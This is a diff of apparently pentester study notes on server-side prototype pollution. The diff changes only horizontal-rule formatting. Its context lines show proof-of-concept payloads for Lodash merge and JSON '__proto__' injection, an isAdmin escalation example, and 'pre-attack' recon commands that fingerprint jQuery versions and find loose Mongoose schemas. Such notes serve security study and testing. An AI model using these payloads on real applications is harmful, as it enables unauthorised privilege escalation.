@@ -17,7 +17,7 @@ linked:
 ---
 # Prototype Pollution - Vectores Server-Side
 
-***
+---
 
 ## Lodash (`_.merge` / `_.set` / `_.defaultsDeep`)
 
@@ -45,7 +45,7 @@ _.merge(obj, userInput);
 console.log({}.isAdmin);  // true — TODOS los objetos ahora tienen isAdmin
 ```
 
-___
+---
 
 ## jQuery `$.extend` deep
 
@@ -57,7 +57,7 @@ ___
 | `curl -s https://target/static/jquery*.js \| grep -oE 'jQuery v[0-9.]+' \| head -1` | Identify jQuery version | Pre-attack. |
 ^pp-server-jquery
 
-___
+---
 
 ## Express body-parser y `qs`
 
@@ -88,7 +88,7 @@ app.get('/health', (req,res) => res.json({status: 'ok'}));
 // curl https://target/health → {status:"ok",isAdmin:true}
 ```
 
-___
+---
 
 ## Mongoose Schema Bypass
 
@@ -102,7 +102,7 @@ ___
 | `grep -rE 'strict\s*:\s*false' models/` | Identify schemas vulnerable | Pre-attack source. |
 ^pp-server-mongoose
 
-___
+---
 
 ## `Object.assign` con Input Controlado
 
@@ -135,4 +135,4 @@ merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
 console.log({}.polluted);  // 'yes' — global pollution
 ```
 
-***
+---
